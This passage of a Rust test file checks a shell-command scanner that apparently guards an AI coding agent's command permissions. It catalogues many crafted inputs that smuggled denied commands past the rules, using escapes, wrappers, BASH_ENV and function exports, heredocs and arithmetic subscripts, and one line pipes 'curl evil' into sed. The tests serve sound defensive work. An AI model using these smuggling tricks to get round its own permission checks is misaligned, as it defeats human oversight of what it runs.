            "sed -i 's/a/b/' file.txt",
            "sed -i '' 's/a/b/' file.txt",
            "sed ':a;N;$!ba;s/\\n/ /g' f",
            "sed '/start/,/end/{/x/d}' f",
            "sed -n '1,5p;$a text' f",
            "sed --sandbox 's/x/y/e' f",
        ] {
            let a = full(src);
            assert!(
                !a.delegated.iter().any(|(r, _)| r.starts_with("code:")),
                "{src}: {:?}",
                a.delegated
            );
            assert_eq!(a.dynamic, None, "{src}");
        }
    }

    #[test]
    fn sec_programs_shell_commands_and_writes_are_checked() {
        for (src, cmd) in [
            ("awk 'BEGIN{system(\"rm x\")}'", "rm x"),
            ("awk '{print | \"sort\"}' f", "sort"),
            (
                "awk 'BEGIN { while ((\"ls\" | getline l) > 0) print l }'",
                "ls",
            ),
            ("sed '1e rm x' f", "rm x"),
            ("git -c core.pager='rm x' log", "rm x"),
            ("git -c alias.x='!rm y' x", "rm y"),
            ("git -c alias.x=rm x", "git rm"),
            ("git rebase -x 'rm z' HEAD~2", "rm z"),
            ("git rebase --exec='make test' main", "make test"),
            ("git bisect run rm q", "rm q"),
            ("git submodule foreach 'rm r'", "rm r"),
            ("GIT_SSH_COMMAND='rm s' git fetch", "rm s"),
            ("export GIT_SSH_COMMAND='rm s'; git fetch", "rm s"),
            ("sudo GIT_SSH_COMMAND='rm t' git fetch", "rm t"),
            ("env PAGER='rm u' man ls", "rm u"),
            ("LESSOPEN='|rm v %s' less f", "rm v %s"),
        ] {
            let a = full(src);
            assert!(has(&a.delegated, cmd), "{src}: {:?}", a.delegated);
        }
        // Pagers that only page ask nothing new.
        for src in [
            "GIT_PAGER=cat git log",
            "git -c core.pager=cat log",
            "GIT_EDITOR=true git rebase -i HEAD~1",
            "git -c user.name=me commit -m hi",
        ] {
            let a = full(src);
            assert!(
                a.delegated.iter().all(|(r, _)| r.starts_with("git")),
                "{src}: {:?}",
                a.delegated
            );
            assert_eq!(a.dynamic, None, "{src}");
        }
        for src in [
            "git -c core.pager=\"$p\" log",
            "git -c include.path=x log",
            "git -c protocol.ext.allow=always clone ext::x",
            "GIT_CONFIG_KEY_0=core.pager git log",
            "GIT_SSH_COMMAND=\"$c\" git fetch",
        ] {
            assert!(full(src).dynamic.is_some(), "{src}");
        }
        let paths = |src: &str| -> Vec<Option<String>> {
            full(src).writes.into_iter().map(|w| w.path).collect()
        };
        assert_eq!(paths("awk '{print > \"o\"}' f"), [Some("o".to_string())]);
        assert_eq!(paths("awk -F: '{print $1 > $2}' f"), [None]);
        assert_eq!(paths("sed 'w out' f"), [Some("out".to_string())]);
        assert_eq!(paths("sed 's/a/b/w out2' f"), [Some("out2".to_string())]);
        assert_eq!(paths("find . -fprint o"), [Some("o".to_string())]);
    }

    #[test]
    fn sec_zsh_short_loops_are_read() {
        for (src, cmds) in [
            ("for x (a b) rm $x", &["rm $x"][..]),
            ("for x in a b; rm $x", &["rm $x"]),
            ("for x (a b); rm $x", &["rm $x"]),
            ("for x (a\nb)\nrm $x", &["rm $x"]),
            ("for k v (a 1 b 2) echo $k$v", &["echo $k$v"]),
            ("for x (a b) { rm $x; }", &["rm $x"]),
            ("for x (a b) do rm $x; done", &["rm $x"]),
            ("for ((i=0;i<2;i++)) rm $i", &["rm $i"]),
            (
                "for x (a) rm $x && touch y; echo z",
                &["rm $x", "touch y", "echo z"],
            ),
            ("for x (a) for y (b) rm $x$y", &["rm $x$y"]),
        ] {
            assert_eq!(resources(src), cmds, "{src}");
        }
        for src in ["for x in a b; done", "for x (a b) ;; rm x", "for x (a b"] {
            assert!(scan(src).is_err(), "{src}");
        }
    }

    #[test]
    fn sec_dash_arithmetic_names_are_dynamic_only_when_they_can_name_a_command() {
        for src in [
            "x=rm; (( $x ))",
            "read x; (( $x ))",
            "for x in rm; do (( $x )); done",
            ": ${x:=rm}; (( $x ))",
            "(( $(echo rm) ))",
            "(( $1 ))",
            "echo rm; (( $_ ))",
            "(( ${x:-rm} ))",
        ] {
            assert!(full(src).dynamic.is_some(), "{src}");
        }
        for src in [
            "(( $x ))",
            "i=0; while (( $i < 3 )); do i=$((i + 1)); done",
            "for i in 1 2; do (( $i > 1 )); done",
            "(( ${#x} > 2 ))",
            "(( $? ))",
        ] {
            assert_eq!(full(src).dynamic, None, "{src}");
        }
    }

    #[test]
    fn sec_programs_and_wrappers_in_bounded_time() {
        // Programs the scan reads (awk, sed, shell strings in them) count
        // toward the same budget, and nest no deeper than other strings.
        let limit = std::time::Duration::from_secs(2);
        let awk = format!("awk '{}'", "{ print $1 > \"o\" } ".repeat(3000));
        timed(&awk, limit).unwrap();
        let sed = format!("sed '{}' f", "s/a/b/g;".repeat(7000));
        timed(&sed, limit).unwrap();
        let calls = format!("awk 'BEGIN {{ {} }}'", "system(\"rm x\"); ".repeat(3000));
        timed(&calls, limit).unwrap();
        let wrappers = format!("{}rm x", "nice taskset 1 flock l stdbuf -oL ".repeat(1500));
        timed(&wrappers, limit).unwrap();
        let loops = format!("{}rm x", "for x (a) ".repeat(100));
        timed(&loops, limit).unwrap();
        let mut nested = String::from("rm x");
        for _ in 0..12 {
            nested = format!(
                "awk 'BEGIN {{ system(\"{}\") }}'",
                nested.replace('\'', "'\\''").replace('"', "\\\"")
            );
        }
        timed(&nested, limit).ok();
    }

    #[test]
    fn sec_exhausted_step_budget_is_refused() {
        let shared = Shared::default();
        shared.steps.set(MAX_STEPS + 1);
        assert_eq!(scan_shared("echo ok", &shared).err(), Some(TOO_COMPLEX));
        let e = analyze_shared("echo ok", Path::new("/workspace"), &shared).unwrap_err();
        assert!(e.ends_with("command too complex to check"), "{e}");
        // Running out inside a nested scan (here a shell string, whose
        // failure alone would only mark the command dynamic) still refuses
        // the command.
        let src = "echo ok; sh -c 'echo a b c'";
        let outer = Shared::default();
        scan_shared(src, &outer).unwrap();
        let shared = Shared::default();
        shared.steps.set(MAX_STEPS - outer.steps.get());
        let e = analyze_shared(src, Path::new("/workspace"), &shared).unwrap_err();
        assert!(e.ends_with("command too complex to check"), "{e}");
    }

    #[test]
    fn sec_random_nesting_in_bounded_time() {
        // Every construct that reads text again (substitutions, arithmetic,
        // subscripts, parameters, quotes, compound commands, heredocs,
        // continuations), nested at random: each input finishes well inside
        // the limit, read or refused.
        const HOLES: [&str; 26] = [
            "$(echo X)",
            "$((X))",
            "$((a[X]))",
            "$(( (X) ))",
            "((X))",
            "$[X]",
            "${x:-X}",
            "${x[X]}",
            "\"X\"",
            "'X'",
            "`X`",
            "(X)",
            "{ X; }",
            "<(X)",
            "a[X]=1",
            "x=(X)",
            "if X; then X; fi",
            "while X; do X; done",
            "case X in X) X;; esac",
            "[[ X ]]",
            "X | X",
            "X && X",
            "X\\\nX",
            "$(cat <<E\nX\nE\n)",
            "for i in X; do X; done",
            "sh -c 'X'",
        ];
        let mut seed = 0x9e37_79b9_7f4a_7c15u64;
        let mut next = move |n: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            (seed % n as u64) as usize
        };
        let limit = std::time::Duration::from_secs(2);
        for _ in 0..300 {
            let depth = 8 + next(60);
            let mut src = String::from("X");
            for _ in 0..depth {
                // Fill one `X` at random with a construct holding more.
                let holes: Vec<usize> = src.match_indices('X').map(|(i, _)| i).collect();
                let at = holes[next(holes.len())];
                src.replace_range(at..at + 1, HOLES[next(HOLES.len())]);
                if src.len() > 8_000 {
                    break;
                }
            }
            let src = format!("echo {}", src.replace('X', "1"));
            let _ = timed(&src, limit);
        }
    }

    #[test]
    fn oc_scan_redirects_stay_visible_across_lists_and_pipelines() {
        let cases: &[(&str, &[&str])] = &[
            (
                "printf hello | cat > marker",
                &["printf hello", "cat > marker"],
            ),
            (
                "printf ok && git status > output",
                &["printf ok", "git status > output"],
            ),
            ("cat > output", &["cat > output"]),
            ("cat > output | cat", &["cat > output", "cat"]),
            ("pwd | > output cat > tail", &["pwd", "> output cat > tail"]),
            ("pwd && cat > output file", &["pwd", "cat > output file"]),
            ("pwd; cat > output", &["pwd", "cat > output"]),
            ("pwd\ncat > output", &["pwd", "cat > output"]),
        ];
        for (src, want) in cases {
            assert_eq!(resources(src), *want, "{src}");
        }
    }

    /// Every resource is covered by its own save rule (OpenCode's oracle).
    fn check_resources(src: &str) {
        let assignment = regex::Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*=").unwrap();
        let redirect = regex::Regex::new(r"^(?:\d*>>?|\d*>&|&>>?|\d*<|\d*<>|>\|)").unwrap();
        let parsed = parse(src);
        for (resource, save) in parsed.commands {
            if !assignment.is_match(&resource)
                && !redirect.is_match(&resource)
                && !resource.contains("\\\n")
            {
                assert!(
                    crate::wildcard::matches(&resource, &save, false),
                    "{src}: {resource:?} not covered by {save:?}"
                );
            }
        }
    }

    #[test]
    fn oc_scan_redirect_positions_across_generated_boundaries() {
        let redirects = [
            ">output",
            ">>output",
            "<input",
            "2>err",
            "2>&1",
            "<&0",
            ">|output",
            "&>output",
            "&>>output",
        ];
        let separators = [" | ", " |& ", " && ", " || ", "; ", " & ", "\n"];
        for r in redirects {
            for c in [
                format!("{r} git status"),
                format!("git {r} status"),
                format!("git status {r}"),
                format!("{r} git status 3>tail"),
                format!("{r} FOO=bar git status 3>tail"),
                format!("npm run {r} test"),
            ] {
                check_resources(&c);
                for s in separators {
                    check_resources(&format!("printf ok{s}{c}"));
                    check_resources(&format!("{c}{s}pwd >last"));
                }
            }
        }
    }

    #[test]
    fn oc_scan_redirect_nested_commands_prefixes_and_context() {
        for src in [
            "pwd | cat >out | tail >log",
            "pwd && cat >out || tail >log",
            "pwd && cat >out | tail >log",
            "pwd | cat >out && tail >log",
            "pwd |\n\n# comment\ncat >out",
            "pwd &&\n# comment\ncat >out",
            "pwd | cat >out # comment\ncat >log",
            "pwd | cat # comment\n>out cat",
            "pwd | cat \\\n 2>out",
            "pwd | cat a\\\n>out",
            "pwd | cat 2\\\n>out",
            "pwd && FOO=bar >output git status 3>tail",
            "(cat >out) | tail >log",
            "{ cat >out; } && tail >log",
            "(pwd | cat >out) >group",
            "(cat >out) >$(printf log) && cat >tail",
            "(cat >out); cat >tail",
            "echo $(pwd | cat >out) >outer",
            r#"echo "$(pwd && cat >out)" | cat >outer"#,
            "echo `pwd | cat >out` >outer",
            "pwd | cat >$(printf out)",
            r#"pwd | cat >"$(printf out)""#,
            "pwd | cat >$(printf out | cat >inner)",
            "pwd | cat >out $(printf arg) >tail",
            "pwd | cat <(printf input) > >(cat >log)",
            "cat <(pwd | cat >out) | cat >tail",
            "pwd | cat >out <(printf arg) >tail",
            r#"pwd | cat '>' "2>out" escaped\>word >out"#,
            "pwd | cat '2'>out",
            r"pwd | cat 2\>out",
            "if true; then printf ok && cat >$(printf path); fi",
            "if true; then printf ok && git >out status; else cat >log; fi",
            "time git status",
            "time -p git status",
            "coproc git status",
        ] {
            check_resources(src);
        }
    }

    #[test]
    fn oc_scan_redirect_keeps_full_resource_and_nested_target_commands() {
        let src = r#"pwd | git >"$(printf output)" status"#;
        let c = cmds(src);
        assert_eq!(c[1].resource, r#"git >"$(printf output)" status"#);
        assert_eq!(c[1].words, ["git", "status"]);
        assert_eq!(c[1].redirect_word_count, Some(1));
        assert_eq!(c[2].raw_words, ["printf", "output"]);
        assert_eq!(
            parse(src).commands[1],
            (
                r#"git >"$(printf output)" status"#.to_string(),
                "git *".to_string()
            )
        );
    }

    #[test]
    fn oc_scan_redirect_after_continuation_on_pipeline_rhs() {
        let src = "pwd | cat\\\n >out";
        assert_eq!(cmds(src)[1].raw_words, ["cat"]);
        assert_eq!(
            parse(src).commands,
            pairs(&[("pwd", "pwd *"), ("cat\\\n >out", "cat *")])
        );
    }

    #[test]
    fn oc_scan_saved_prefixes_cover_standalone_continuations() {
        for src in [
            "cat\\\n",
            "cat \\\n",
            "cat\\\n\\\n",
            "cat\\\n;",
            "cat >out\\\n",
            "cat >out \\\n",
        ] {
            assert_eq!(cmds(src)[0].raw_words, ["cat"], "{src:?}");
            let want = if src.contains(">out") {
                "cat >out"
            } else {
                "cat"
            };
            assert_eq!(
                parse(src).commands[0],
                (want.to_string(), "cat *".to_string()),
                "{src:?}"
            );
        }
    }

    #[test]
    fn oc_scan_meaningful_raw_syntax_before_trailing_continuation() {
        for src in [
            "printf 'literal\\\n'\\\n",
            "printf \"literal\\\n\"\\\n",
            "printf a\\\nb\\\n",
            "printf a\\\n\"\"\\\n",
        ] {
            let c = &cmds(src)[0];
            assert_eq!(c.resource, &src[..src.len() - 2], "{src:?}");
            assert_eq!(
                c.raw_words,
                ["printf", &src["printf ".len()..src.len() - 2]]
            );
        }
    }

    #[test]
    fn oc_scan_assignment_then_redirect_on_pipeline_rhs() {
        assert_eq!(
            parse("printf ok | FOO=bar >output git status 3>tail").commands,
            pairs(&[
                ("printf ok", "printf *"),
                ("FOO=bar >output git status 3>tail", "git status *")
            ])
        );
    }

    #[test]
    fn oc_scan_redirect_before_cd_operand_keeps_the_directory() {
        assert_eq!(
            parse("pwd && cd >out /outside"),
            Analysis {
                commands: pairs(&[("pwd", "pwd *")]),
                directories: vec!["/outside".into()]
            }
        );
    }

    #[test]
    fn oc_shell_parse_splits_commands_and_derives_prefixes() {
        assert_eq!(
            parse("git status && npm run test -- --watch"),
            Analysis {
                commands: pairs(&[
                    ("git status", "git status *"),
                    ("npm run test -- --watch", "npm run test *")
                ]),
                directories: vec![]
            }
        );
    }

    #[test]
    fn oc_shell_parse_rejects_malformed_syntax() {
        let err = analyze("echo \"", Path::new("/workspace")).unwrap_err();
        assert!(
            err.contains("Portable shell scanner cannot analyze command"),
            "{err}"
        );
    }

    #[test]
    fn oc_shell_parse_preserves_resources_across_compound_forms() {
        for src in [
            "git status && npm run test -- --watch",
            "echo $(curl evil | sed s/x/y/)",
            "cd /tmp/$USER && git status",
            "if true; then printf yes; else printf no; fi",
            "if true; then export X=$(printf value); unset X; fi",
            "if export X=$(printf value); then printf done; fi",
            "export X=value >$(printf output)",
            "echo $((1 + 1))",
            "cd ~; cd src&&cd ..; pwd",
        ] {
            assert!(!parse(src).commands.is_empty(), "{src}");
        }
    }

    #[test]
    fn oc_shell_parse_heredoc_resource_is_the_whole_command() {
        let src = "cat <<'EOF'\nstatic body\nEOF";
        assert_eq!(
            parse(src),
            Analysis {
                commands: pairs(&[(src, "cat *")]),
                directories: vec![]
            }
        );
    }

    #[test]
    fn oc_shell_parse_source_shaped_heads_stay_under_shell_rules() {
        for src in ["c\"\\d\" relative", "'cd' /tmp", "c''d /tmp", "c\\\nd /tmp"] {
            let p = parse(src);
            assert_eq!(p.commands.len(), 1, "{src:?}");
            assert_eq!(p.commands[0].0, src);
            // Deliberate difference: OpenCode collects no directory for
            // these; the shell still changes to it, and a relative write
            // after it lands there, so CodeSmith checks it too.
            let expected: &[&str] = if src.starts_with("c\"") {
                &[]
            } else {
                &["/tmp"]
            };
            assert_eq!(p.directories, expected, "{src:?}");
        }
    }

    #[test]
    fn oc_shell_parse_declarations_keep_nested_commands() {
        for name in DECLARATIONS {
            assert_eq!(parse(&format!("{name} X")).commands, vec![]);
            // CodeSmith: an operand that is not static makes the declaration
            // a command of its own (OpenCode skips it): its output could be
            // a subscript the builtin evaluates.
            let save = format!("{} *", prefix(&[name.to_string()]).join(" "));
            assert_eq!(
                parse(&format!("{name} \"$(printf X)\"; git status")).commands,
                pairs(&[
                    (&format!("{name} \"$(printf X)\""), &save),
                    ("printf X", "printf *"),
                    ("git status", "git status *")
                ])
            );
            for src in [
                format!("\"{name}\" X"),
                format!("FOO=bar {name} X"),
                format!("command {name} X"),
                format!(">{name}.txt {name} X"),
            ] {
                assert_eq!(parse(&src).commands.len(), 1, "{src}");
            }
        }
    }

    #[test]
    fn oc_shell_parse_declarations_keep_directory_checks_in_substitutions() {
        assert_eq!(
            parse("export X=$(cd /outside; printf value)"),
            Analysis {
                // CodeSmith: the declaration is checked too (see above).
                commands: pairs(&[
                    ("export X=$(cd /outside; printf value)", "export *"),
                    ("printf value", "printf *")
                ]),
                directories: vec!["/outside".into()]
            }
        );
    }

    #[test]
    fn oc_shell_parse_directory_changes_are_not_shell_resources() {
        assert_eq!(
            parse("cd 'src dir' && git status"),
            Analysis {
                commands: pairs(&[("git status", "git status *")]),
                directories: vec!["src dir".into()]
            }
        );
    }

    #[test]
    fn oc_shell_parse_static_directory_targets() {
        let p = parse(
            "cd .\\./outside && cd escaped\\ space && cd '../$literal' && cd \"../\\$literal2\" && cd before\\\nafter",
        );
        assert_eq!(
            p.directories,
            [
                "../outside",
                "escaped space",
                "../$literal",
                "../$literal2",
                "beforeafter"
            ]
        );
        let p = parse("cd -P /first && cd -- -/../../../etc && cd -");
        assert_eq!(p.directories, ["/first", "-/../../../etc"]);
        assert_eq!(
            parse("command cd /outside; builtin cd /elsewhere; command -v cd"),
            Analysis {
                commands: pairs(&[
                    ("command cd /outside", "command *"),
                    ("builtin cd /elsewhere", "builtin *"),
                    ("command -v cd", "command *")
                ]),
                directories: vec!["/outside".into(), "/elsewhere".into()]
            }
        );
        let root = if cfg!(target_os = "macos") {
            "/var/root"
        } else {
            "/root"
        };
        assert_eq!(
            parse("cd ~root/secret && cd '~root'").directories,
            [format!("{root}/secret"), "~root".into()]
        );
        let p = parse(
            "cd ~+/../outside && cd ~- && cd ~+1 && cd ~0 && cd ~__opencode_nonexistent_user__",
        );
        assert_eq!(p.directories, ["/workspace/../outside"]);
        assert_eq!(
            p.commands,
            pairs(&[
                ("cd ~-", "cd *"),
                ("cd ~+1", "cd *"),
                ("cd ~0", "cd *"),
                ("cd ~__opencode_nonexistent_user__", "cd *")
            ])
        );
        let p = parse("cd {..,x} && cd .[.] && cd .? && cd $'\\x2e'[.] && cd '.[.]'");
        assert_eq!(p.directories, [".[.]"]);
        assert_eq!(
            p.commands,
            pairs(&[
                ("cd {..,x}", "cd *"),
                ("cd .[.]", "cd *"),
                ("cd .?", "cd *"),
                ("cd $'\\x2e'[.]", "cd *")
            ])
        );
        let p = parse("cd ~nobody");
        assert_eq!(p.directories.len(), 1);
    }

    #[test]
    fn oc_shell_parse_commandless_and_redirected_declarations() {
        assert_eq!(
            parse(">> ~/.zshrc <<< 'x'; export -p > ~/.bashrc"),
            Analysis {
                commands: pairs(&[
                    (">> ~/.zshrc <<< 'x'", ">> *"),
                    ("export -p > ~/.bashrc", "export *")
                ]),
                directories: vec![]
            }
        );
    }

    #[test]
    fn oc_shell_parse_expands_deterministic_directories() {
        let home = dirs::home_dir().unwrap();
        assert_eq!(
            parse("cd ~/src").directories,
            [home.join("src").display().to_string()]
        );
        assert_eq!(parse("cd '~\\src'").directories, ["~\\src"]);
    }

    // ---------------------------------------------------------------------
    // CodeSmith security regressions: each input ran a command the rules
    // denied (checked with bash, zsh and dash) before the fix.
    // ---------------------------------------------------------------------

    fn has(list: &[(String, String)], resource: &str) -> bool {
        list.iter().any(|(r, _)| r == resource)
    }

    #[test]
    fn sec_declarations_with_subscripts_are_commands() {
        for (src, decl) in [
            ("declare 'a[$(touch P1)]=1'", "declare 'a[$(touch P1)]=1'"),
            ("typeset 'a[$(touch P2)]=1'", "typeset 'a[$(touch P2)]=1'"),
            ("a=(1); unset 'a[$(touch P3)]'", "unset 'a[$(touch P3)]'"),
            ("export 'a[$(touch P4)]=1'", "export 'a[$(touch P4)]=1'"),
            ("local x=$y", "local x=$y"),
            (
                "declare -n r='a[$(touch P5)]'",
                "declare -n r='a[$(touch P5)]'",
            ),
        ] {
            let a = full(src);
            assert!(has(&a.commands, decl), "{src}: {:?}", a.commands);
        }
        for src in [
            "declare 'a[$(touch P1)]=1'",
            "typeset 'a[$(touch P2)]=1'",
            "a=(1); unset 'a[$(touch P3)]'",
        ] {
            assert!(full(src).dynamic.is_some(), "{src}");
        }
        for src in [
            "export A=1 B",
            "declare -x FOO=bar",
            "unset X Y",
            "readonly R='a b'",
        ] {
            let a = full(src);
            assert!(a.commands.is_empty() && a.dynamic.is_none(), "{src}: {a:?}");
        }
    }

    #[test]
    fn sec_arithmetic_substitutions_are_commands() {
        for src in [
            "echo $((0$(touch X)))",
            "echo \"$((1+$(touch X)))\"",
            "echo $(( `touch X` ))",
            "true $((0$(touch X)))",
            "echo $(( '$(touch X)' ))",
            "(( $(touch X) ))",
            "echo $[1+$(touch X)]",
            "for ((i=$(touch X); i<1; i++)); do :; done",
            "echo ${x/$(touch X)/}",
            "echo ${x:$(touch X)}",
            "echo ${x:-$(touch X)}",
            "cat <<< $(touch X)",
            "cat <(touch X)",
        ] {
            let a = full(src);
            assert!(has(&a.commands, "touch X"), "{src}: {:?}", a.commands);
        }
        // The substituted output is evaluated again as arithmetic.
        assert!(full("echo $((0$(touch X)))").dynamic.is_some());
    }

    #[test]
    fn sec_text_evaluated_as_arithmetic_is_dynamic() {
        for src in [
            "x='a[$(touch M3)]'; echo $((x))",
            "x='a[$(touch M)]'; declare -i y=x",
            "x='a[$(touch M)]'; [[ x -eq 1 ]]",
            "x='a[$(touch M)]'; echo $[x]",
            "x='a[$(touch M)]'; y=(1); y[x]=2",
            "x='a[$(touch M)]'; echo ${y[x]}",
            "x='a[$(touch M)]'; echo ${y:x}",
            "x='$(touch M)'; echo ${x@P}",
            "x='a[$(touch M)]'; echo ${!x}",
            "x=$(cat evil.txt); echo $((x))",
            "read x < evil.txt; echo $((x + 1))",
            "for f in *; do echo $((f)); done",
            "let 'a[$(touch M)]=1'",
            "printf -v 'a[$(touch M)]' x",
            "x=$'\\x24(touch M)'; echo $((a[x]))",
            "alias ls='touch M'\nls",
        ] {
            assert_eq!(
                full(src).dynamic.as_deref(),
                Some("dynamic-execution"),
                "{src}"
            );
        }
        for src in [
            "VALUE=$(printf 2); echo $((VALUE + 1))",
            "n=$(wc -l < f); echo $((n + 1))",
            "echo $((1 + 2))",
            "i=0; echo $((i + 1))",
            "grep -n '$(x)' file",
            "echo '$HOME'; ls",
            "for f in *.rs; do wc -l \"$f\"; done",
        ] {
            assert_eq!(full(src).dynamic, None, "{src}");
        }
    }

    #[test]
    fn sec_wrappers_check_the_wrapped_command() {
        for (src, wrapped) in [
            ("env touch X", "touch X"),
            ("env -i FOO=1 touch X", "touch X"),
            ("command touch X", "touch X"),
            ("builtin cd x", "cd x"),
            ("exec touch X", "touch X"),
            ("nohup touch X", "touch X"),
            ("time touch X", "touch X"),
            ("sudo -u root touch X", "touch X"),
            ("nice -n 5 touch X", "touch X"),
            ("timeout -k 1 5 touch X", "touch X"),
            ("xargs -I {} touch {}", "touch {}"),
            ("ls | xargs touch", "touch"),
            ("find . -name x -exec touch {} \\;", "touch {}"),
            ("find . -execdir rm {} +", "rm {}"),
            ("sudo env touch X", "touch X"),
            ("bash -c 'touch X'", "touch X"),
            ("sh -ec 'cd /tmp; touch X'", "touch X"),
            ("zsh -c \"touch X\"", "touch X"),
            ("eval 'touch X'", "touch X"),
            ("eval touch X", "touch X"),
            ("trap 'touch X' EXIT", "touch X"),
            ("xargs sh -c 'touch X'", "touch X"),
            ("r''m -rf x", "rm -rf x"),
            ("\\rm -rf x", "rm -rf x"),
            ("X=1 rm -rf x", "rm -rf x"),
        ] {
            let a = full(src);
            assert!(has(&a.delegated, wrapped), "{src}: {:?}", a.delegated);
            assert_eq!(a.dynamic, None, "{src}");
        }
        assert_eq!(full("sh -c 'cd /tmp; touch X'").directories, ["/tmp"]);
        for src in [
            "bash -c \"$CMD\"",
            "eval \"$x\"",
            "trap \"$x\" EXIT",
            "C=touch; $C X",
            "$(printf touch) X",
            "/bin/t?uch X",
            "{touch,X}",
            "env -S 'touch X'",
        ] {
            assert!(full(src).dynamic.is_some(), "{src}");
        }
        assert!(full("command -v touch").delegated.is_empty());
    }

    #[test]
    fn sec_redirect_targets_are_writes() {
        let home = dirs::home_dir().unwrap().display().to_string();
        let writes = |src: &str| -> Vec<Option<String>> {
            full(src).writes.into_iter().map(|w| w.path).collect()
        };
        assert_eq!(
            writes("echo x > ~/.zshrc"),
            [Some(format!("{home}/.zshrc"))]
        );
        assert_eq!(writes("ls > ~/.bashrc"), [Some(format!("{home}/.bashrc"))]);
        assert_eq!(
            writes("git diff >> out 2> err"),
            [Some("out".into()), Some("err".into())]
        );
        assert_eq!(
            writes("cmd &> 'a b' >| c <> d"),
            [Some("a b".into()), Some("c".into()), Some("d".into())]
        );
        assert_eq!(writes("cmd >&file"), [Some("file".into())]);
        assert_eq!(writes("{ echo; } > grouped"), [Some("grouped".into())]);
        assert_eq!(writes("echo x > $f"), [None]);
        assert_eq!(writes("echo x > *.txt"), [None]);
        assert!(writes("cmd 2>&1 >&2 <in 1>&-").is_empty());
        assert_eq!(
            writes("bash -c 'echo x > ~/.zshrc'"),
            [Some(format!("{home}/.zshrc"))]
        );
    }

    #[test]
    fn sec_saved_prefixes_stop_at_options() {
        for (src, save) in [
            ("git -c core.pager=x status", "git -c core.pager=x status"),
            ("npm exec -- foo", "npm exec -- foo"),
            ("make -f evil.mk", "make -f evil.mk"),
            ("git status --short", "git status *"),
            ("rm -rf x", "rm *"),
            ("cargo test -p x", "cargo test *"),
        ] {
            assert_eq!(full(src).commands[0].1, save, "{src}");
        }
    }

    /// Bypasses found by `tests/shell_differential.rs` (real shells running
    /// against logging shims): each input runs `rm F`, so the scan must
    /// report an `rm` command, flag the input as dynamic, or refuse it.
    #[test]
    fn sec_differential_bypasses_are_checked() {
        for src in [
            "$'\\x72m' F",
            "$'\\162m' F",
            "$'\\162\\155' F",
            "$'\\u0072m' F",
            "eval $'rm\\x20F'",
            "nice $'\\x67'it status; rm F",
            "../bin/rm F",
            "./../bin/rm F",
            "~/../bin/rm F",
            "env ../bin/rm F",
            "=rm F",
            "a=($(rm F))",
            "a=([$(rm F)]=1)",
            "a=(['$(rm F)']=1); declare -p a",
            "echo 'rm F' | sh",
            "echo 'rm F' | bash",
            "bash <<< 'rm F'",
            "bash -s < x",
            "bash /dev/stdin <<< 'rm F'",
            "bash - <<< 'rm F'",
            "bash < <(echo rm F)",
            "source <(echo rm F)",
            ". <(echo rm F)",
            "source /dev/stdin <<< 'rm F'",
            "ENV='$(rm F)' sh -ic :",
            "BASH_ENV='$(rm F)' bash -c :",
            "env BASH_ENV='$(rm F)' bash -c :",
            "env PS4='$(rm F)' bash -xc :",
            "env 'BASH_FUNC_ls%%=() { rm F; }' bash -c ls",
            "NULLCMD=rm; >F",
            "mapfile -C 'rm F' -c 1 a <<< x",
            "readarray -C 'rm F' -c 1 a <<< x",
            "compgen -C 'rm F' x",
            "history -s 'rm F'; fc -s",
            "x='r*'; $~x F",
            "x='rm F'; $=x",
            "noglob rm F",
            "nocorrect rm F",
            "repeat 1 rm F",
            "repeat 1 { rm F }",
            "{rm}>out",
            "coproc rm F",
            "coproc X=1 rm F",
            "time X=1 rm F",
            "env -- X=1 rm F",
            "echo \"$\\\n(rm F)\"",
            "cat <<EOF\n$\\\n(rm F)\nEOF",
            "cat <<EOF\nEO\\\nF\nrm F\nEOF",
            "cat <<EOF\nx \\\nEOF\ncat <<Z\nEOF\nrm F\nZ",
            "x='a[$(rm F)]'; (\\\n( x ))",
            "x='a[$(rm F)]'; echo $(\\\n( x ))",
            "echo \"${x:-'$(rm F)'}\"",
            "x=1; echo \"${x:+'`rm F`'}\"",
            "hash ls=../bin/rm; ls F",
            "x='*(e:rm F:)'; echo $~x",
            "x='*(e:rm F:)'; echo ${~x}",
            "x='a[$(rm F)]'; a=(1); echo $a[x]",
            "xargs -I X sh -c X <<< 'rm F'",
            "xargs -I{} sh -c 'echo {}' <<< 'x; rm F'",
            "xargs -I{} env {} F <<< rm",
            "echo 'rm F' | xargs env",
            "find . -exec sh -c 'echo {}' \\;",
            "echo $(cat <<EOF\n)\nrm F\nEOF\n)",
            "echo \"$(cat <<'EOF'\n)\"; rm F; echo \"(\nEOF\n)\"",
            "echo \"$(echo ${x%)}\"; rm F; \": )\"",
            "BASH_CMDS[ls]=../bin/rm; ls F",
            "BASH_CMDS=([ls]=../bin/rm); ls F",
            "declare BASH_CMDS[ls]=../bin/rm; ls F",
            "commands[ls]=../bin/rm; ls F",
            "functions[f]='rm F'; f",
            "functions=(f 'rm F'); f",
            "set -A functions f 'rm F'; f",
            "chpwd_functions=(rm); cd sub",
            "x=$(cat <<EOF)\nbody\nEOF\nrm F",
            "env -P ../bin rm F",
            "xargs -J % rm % <<< F",
            "xargs -R 1 -I {} rm {} <<< F",
            "eval -- 'rm F'",
            "$'r\\m' F",
            "(( (rm F) ))",
            "(( (\\\nrm F) ; (touch G) ))",
            "env -vS'rm F'",
            "env -iP ../bin rm F",
            "env --P ../bin rm F",
            "builtin - eval 'rm F'",
            "true &- rm F",
            "bash ''/dev/stdin <<< 'rm F'",
            "source /\\dev/fd/3 3<<< 'rm F'",
            "bash ../../../dev/stdin <<< 'rm F'",
            "env =sh -c 'rm F'",
            "env -iP ../binn =rm F",
            "4='$(rm F)' rm F",
            "trap --'\nrm F' 0",
            "(( (rm F) ; ((touchG) )))",
            "env - rm F",
            "r\\\n=m rm F",
            "echo}\\\n rm F",
            "=env 'BASH_FUNC_ls%%=() { rm F; }' bash -c ls",
            "env --iP ../binn =rm F",
            "eco hi >\\ >(rm F)",
            "echo $(( ] ; rm F ))",
            "((] (\\\nrm F) ; (touch G) ))",
            "bash rm F",
            "comman=d bash rm F",
            "repeat 1 X=1 rm F",
            "READNUL\\\nLCMD=rm; <f1",
            "x='a[$(rm F)]'; a=(1); echo $a\\\n[x]",
            "x='a[;$(rm F)]'; echo ${x\\\n:x}",
            "B\\\nASH_CMDS[ls]=../bin/rm; ls F",
            "\"\"=rm F",
            "\"\"=env rm F",
            "echo \"$${x-\"'$(rm F)'\"}\"",
            "echo \"${x:-$'`rm F`'}\"",
            "bash < <(echo rm F)\"\"",
            "echo \"$${x/$$'(rm F)'/y}\"",
